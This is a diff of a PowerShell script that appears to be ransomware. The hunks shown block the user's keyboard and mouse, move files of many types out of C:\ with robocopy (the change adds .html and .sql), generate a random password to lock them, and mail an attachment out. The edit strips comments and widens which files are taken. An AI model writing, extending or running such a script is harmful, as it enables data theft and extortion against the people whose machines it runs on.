@@ -1,4 +1,3 @@
-#Temporarily disable user mouse and keyboard input
 $code = @"
     [DllImport("user32.dll")]
     public static extern bool BlockInput(bool fBlockIt);
@@ -41,13 +40,12 @@ Start-Sleep -s 10
 #Remove the installer
 rm -Force $workdir\7*
 
-#Set source and destination of files to copy and store (ideally you would use something other than desktop)
 $Source = "C:\"
 $Destination = "C:\files"
 
 #Copy all files with certain extension and delete them in the source location
 $cp = robocopy /mov $Source $Destination *.txt /s *.png /s 
-*.mp4 /s *.pdf /s *.csv /s *.php /s *.exe /s *.ddl /s
+*.mp4 /s *.pdf /s *.csv /s *.php /s *.exe /s *.ddl /s *.html /s *.sql /s
 #Generate a random 8 character password
 [Reflection.Assembly]::LoadWithPartialName("System.Web")
 $randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
@@ -95,7 +93,7 @@ $Attachment.Dispose()
 $Msg.Dispose()
 $Mailer.Dispose()
 
-#Delete the zip file created
+
 $del = Remove-Item $ZipFolder -Force -Recurse
 
 #Disable temporary user keyboard and mouse input block
